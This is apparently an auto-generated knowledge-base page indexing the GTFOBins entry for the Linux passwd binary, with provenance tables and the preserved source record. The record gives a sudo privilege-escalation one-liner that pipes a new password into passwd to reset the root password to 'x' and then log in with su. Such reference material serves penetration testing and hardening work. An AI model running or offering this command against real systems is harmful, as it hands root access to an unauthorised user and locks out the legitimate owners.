---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# passwd

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `passwd` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/passwd` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [passwd](../../tools/linux/passwd.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | passwd |
| name | passwd |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/passwd/ |

## Preserved Source Material

```yaml
_body: ''
_name: passwd
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/passwd
functions:
  privilege-escalation:
  - code: echo -e 'x\nx' | passwd
    comment: This changes the root password to `x`, so it's now possible to log in using, for example, `su`.
    contexts:
      sudo: null
```
